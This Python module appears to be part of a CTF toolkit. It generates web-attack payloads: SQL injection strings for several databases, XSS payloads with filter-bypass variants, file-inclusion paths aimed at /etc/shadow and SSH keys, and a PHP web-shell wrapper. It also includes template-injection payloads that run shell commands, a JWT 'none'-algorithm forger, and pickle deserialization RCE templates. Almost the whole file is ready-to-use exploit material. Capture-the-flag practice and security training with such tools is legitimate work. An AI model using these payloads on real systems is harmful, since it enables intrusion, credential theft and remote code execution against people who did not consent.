"""
Web Security Tools Module for CTF-MCP
SQL injection, XSS, SSTI, JWT, and other web exploitation tools
"""

import base64
import json
import re
from typing import Optional


class WebTools:
    """Web security tools for CTF challenges"""

    def get_tools(self) -> dict:
        """Return available tools and their descriptions"""
        return {
            "sql_payloads": "Generate SQL injection payloads",
            "xss_payloads": "Generate XSS payloads",
            "lfi_payloads": "Generate LFI payloads",
            "ssti_payloads": "Generate SSTI payloads",
            "jwt_decode": "Decode JWT token",
            "jwt_forge": "Forge JWT token",
        }

    # === SQL Injection ===

    def sql_payloads(self, dbms: str = "mysql", technique: str = "union") -> str:
        """Generate SQL injection payloads"""
        payloads = {
            "union": {
                "mysql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT username,password,3 FROM users--",
                    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
                    "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--",
                    "1' ORDER BY 1--+",
                    "1' ORDER BY 5--+",
                    "-1' UNION SELECT 1,2,3--+",
                ],
                "postgresql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT version(),NULL,NULL--",
                    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
                ],
                "mssql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT @@version,NULL,NULL--",
                    "' UNION SELECT name,NULL,NULL FROM master..sysdatabases--",
                    "' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--",
                ],
                "sqlite": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT sqlite_version(),NULL,NULL--",
                    "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--",
                    "' UNION SELECT sql,NULL,NULL FROM sqlite_master--",
                ],
            },
            "error": {
                "mysql": [
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
                    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
                    "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
                ],
                "postgresql": [
                    "' AND 1=CAST((SELECT version()) AS INT)--",
                    "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
                ],
                "mssql": [
                    "' AND 1=CONVERT(INT,(SELECT @@version))--",
                    "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                ],
            },
            "blind": {
                "mysql": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND SUBSTRING(version(),1,1)='5'--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
                    "' AND IF(1=1,SLEEP(0),0)--",
                    "' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(2),0)--",
                ],
            },
            "time": {
                "mysql": [
                    "' AND SLEEP(5)--",
                    "' AND IF(1=1,SLEEP(5),0)--",
                    "' AND BENCHMARK(10000000,SHA1('test'))--",
                ],
                "postgresql": [
                    "' AND pg_sleep(5)--",
                    "'; SELECT pg_sleep(5)--",
                ],
                "mssql": [
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' AND 1=1; WAITFOR DELAY '0:0:5'--",
                ],
            },
        }

        if technique not in payloads:
            return f"Unknown technique. Available: {', '.join(payloads.keys())}"

        technique_payloads = payloads[technique]
        if dbms not in technique_payloads:
            return f"No payloads for {dbms}. Available: {', '.join(technique_payloads.keys())}"

        result = [f"SQL Injection Payloads ({dbms.upper()} - {technique.upper()}):", "-" * 50]
        for payload in technique_payloads[dbms]:
            result.append(payload)

        return '\n'.join(result)

    # === XSS ===

    def xss_payloads(self, context: str = "html", bypass: bool = False) -> str:
        """Generate XSS payloads"""
        payloads = {
            "html": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<marquee onstart=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
            ],
            "attribute": [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)',
            ],
            "script": [
                "'-alert(1)-'",
                '"-alert(1)-"',
                "\\'-alert(1)//",
                '</script><script>alert(1)</script>',
                "';alert(1)//",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            ],
        }

        bypass_payloads = [
            # Case variations
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x OnErRoR=alert(1)>',
            # Encoding
            '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
            '<img src=x onerror=\\u0061lert(1)>',
            # Tag breaking
            '<<script>script>alert(1)//<</script>/script>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            # NULL bytes
            '<scr\\x00ipt>alert(1)</script>',
            # Double encoding
            '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            # SVG
            '<svg/onload=alert(1)>',
            '<svg><script>alert&#40;1&#41;</script>',
            # Event handlers
            '<img src=1 onerror=alert`1`>',
            '<img src=1 onerror=alert(String.fromCharCode(88,83,83))>',
        ]

        if context not in payloads:
            return f"Unknown context. Available: {', '.join(payloads.keys())}"

        result = [f"XSS Payloads ({context.upper()} context):", "-" * 50]
        for payload in payloads[context]:
            result.append(payload)

        if bypass:
            result.append("")
            result.append("WAF Bypass Variants:")
            result.append("-" * 50)
            for payload in bypass_payloads:
                result.append(payload)

        return '\n'.join(result)

    # === LFI/RFI ===

    def lfi_payloads(self, os: str = "linux", wrapper: bool = True) -> str:
        """Generate Local File Inclusion payloads"""
        linux_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/home/{user}/.ssh/id_rsa",
            "/home/{user}/.bash_history",
            "/root/.bash_history",
            "/root/.ssh/id_rsa",
        ]

        windows_files = [
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Users\\Administrator\\Desktop\\flag.txt",
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
            "C:\\xampp\\apache\\logs\\access.log",
        ]

        traversal = [
            "../" * i for i in range(1, 10)
        ]

        php_wrappers = [
            "php://filter/convert.base64-encode/resource=",
            "php://filter/read=string.rot13/resource=",
            "php://input",
            "php://data://text/plain,<?php system($_GET['cmd']); ?>",
            "php://data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://id",
            "phar://",
        ]

        files = linux_files if os == "linux" else windows_files

        result = [f"LFI Payloads ({os.upper()}):", "-" * 50]
        result.append("Target Files:")
        for f in files:
            result.append(f"  {f}")

        result.append("")
        result.append("Path Traversal Variants:")
        for t in traversal[:5]:
            result.append(f"  {t}etc/passwd" if os == "linux" else f"  {t}Windows\\win.ini")

        if wrapper:
            result.append("")
            result.append("PHP Wrappers:")
            for w in php_wrappers:
                result.append(f"  {w}")

        result.append("")
        result.append("Bypass Techniques:")
        result.append("  ....//....//etc/passwd")
        result.append("  ..%252f..%252f..%252fetc/passwd")
        result.append("  /etc/passwd%00")
        result.append("  /etc/passwd%00.jpg")

        return '\n'.join(result)

    # === SSTI ===

    def ssti_payloads(self, engine: str = "auto") -> str:
        """Generate Server-Side Template Injection payloads"""
        payloads = {
            "detection": [
                "${7*7}",
                "{{7*7}}",
                "#{7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "{7*7}",
                "{{7*'7'}}",
            ],
            "jinja2": [
                "{{config}}",
                "{{config.items()}}",
                "{{self.__init__.__globals__.__builtins__}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}",
            ],
            "twig": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('exec')}}",
                "{{app.request.server.all|join(',')}}",
            ],
            "freemarker": [
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
            ],
            "velocity": [
                "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##",
            ],
        }

        result = ["SSTI Payloads:", "-" * 50]

        if engine == "auto":
            result.append("Detection Payloads (try these first):")
            for payload in payloads["detection"]:
                result.append(f"  {payload}")
            result.append("")
            result.append("If 49 appears, try Jinja2/Twig payloads")
            result.append("If 7777777 appears, try Jinja2 payloads")
        else:
            if engine not in payloads:
                return f"Unknown engine. Available: {', '.join(payloads.keys())}"

        for eng, pays in payloads.items():
            if engine == "auto" or engine == eng:
                result.append("")
                result.append(f"{eng.upper()} Payloads:")
                for payload in pays:
                    result.append(f"  {payload}")

        return '\n'.join(result)

    # === JWT ===

    def jwt_decode(self, token: str) -> str:
        """Decode and analyze JWT token"""
        parts = token.split('.')
        if len(parts) != 3:
            return "Invalid JWT format (expected 3 parts separated by '.')"

        result = ["JWT Token Analysis:", "-" * 50]

        try:
            # Decode header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            result.append(f"Header: {json.dumps(header, indent=2)}")

            # Decode payload
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))
            result.append(f"\nPayload: {json.dumps(payload, indent=2)}")

            # Signature (base64)
            result.append(f"\nSignature (base64): {parts[2]}")

            # Security analysis
            result.append("\n" + "-" * 50)
            result.append("Security Analysis:")

            if header.get('alg') == 'none':
                result.append("  [!] Algorithm 'none' - Token may be vulnerable!")
            if header.get('alg') == 'HS256':
                result.append("  [*] HS256 - Try brute-forcing weak secrets")
            if header.get('alg') in ['RS256', 'RS384', 'RS512']:
                result.append("  [*] RSA algorithm - Try algorithm confusion attack")

            # Check for sensitive data
            sensitive_keys = ['password', 'secret', 'key', 'token', 'admin', 'role']
            for key in payload:
                if any(s in key.lower() for s in sensitive_keys):
                    result.append(f"  [!] Potentially sensitive field: {key}")

        except Exception as e:
            result.append(f"Decode error: {e}")

        return '\n'.join(result)

    def jwt_forge(self, token: str, payload_changes: dict = None, attack: str = "none") -> str:
        """Forge JWT token with none algorithm or other attacks"""
        parts = token.split('.')
        if len(parts) != 3:
            return "Invalid JWT format"

        try:
            # Decode original
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))

            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            result = ["JWT Forging:", "-" * 50]

            if attack == "none":
                # None algorithm attack
                header['alg'] = 'none'
                if payload_changes:
                    payload.update(payload_changes)

                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

                forged_tokens = [
                    f"{new_header}.{new_payload}.",
                    f"{new_header}.{new_payload}.{parts[2]}",
                ]

                result.append("None Algorithm Attack Tokens:")
                for t in forged_tokens:
                    result.append(f"  {t}")

            elif attack == "weak_secret":
                result.append("Common weak secrets to try:")
                weak_secrets = [
                    "secret", "password", "123456", "admin", "key",
                    "private", "jwt", "token", "auth", "test",
                    "supersecret", "changeme", "default"
                ]
                for s in weak_secrets:
                    result.append(f"  {s}")

                result.append("\nUse jwt_tool or jwt-cracker to bruteforce")

            result.append(f"\nModified Header: {json.dumps(header)}")
            result.append(f"Modified Payload: {json.dumps(payload)}")

        except Exception as e:
            return f"Forge error: {e}"

        return '\n'.join(result)

    # === Deserialization ===

    def php_serialize(self, data: dict) -> str:
        """Generate PHP serialized payload"""
        # Simple PHP serialization for common types
        result = []

        def serialize_value(val):
            if val is None:
                return "N;"
            elif isinstance(val, bool):
                return f"b:{1 if val else 0};"
            elif isinstance(val, int):
                return f"i:{val};"
            elif isinstance(val, float):
                return f"d:{val};"
            elif isinstance(val, str):
                return f's:{len(val)}:"{val}";'
            elif isinstance(val, list):
                items = ''.join(f"i:{i};{serialize_value(v)}" for i, v in enumerate(val))
                return f"a:{len(val)}:{{{items}}}"
            elif isinstance(val, dict):
                items = ''.join(f"{serialize_value(k)}{serialize_value(v)}" for k, v in val.items())
                return f"a:{len(val)}:{{{items}}}"
            return "N;"

        serialized = serialize_value(data)
        return f"PHP Serialized: {serialized}"

    def pickle_payload(self) -> str:
        """Generate Python pickle RCE payload templates"""
        payloads = [
            """
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
""",
            """
# Alternative using subprocess
import pickle
import base64

class RCE:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['id'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
""",
        ]

        result = ["Python Pickle RCE Payloads:", "-" * 50]
        result.append("Generate payload with these Python scripts:")
        for i, p in enumerate(payloads, 1):
            result.append(f"\n--- Payload Template {i} ---")
            result.append(p)

        return '\n'.join(result)
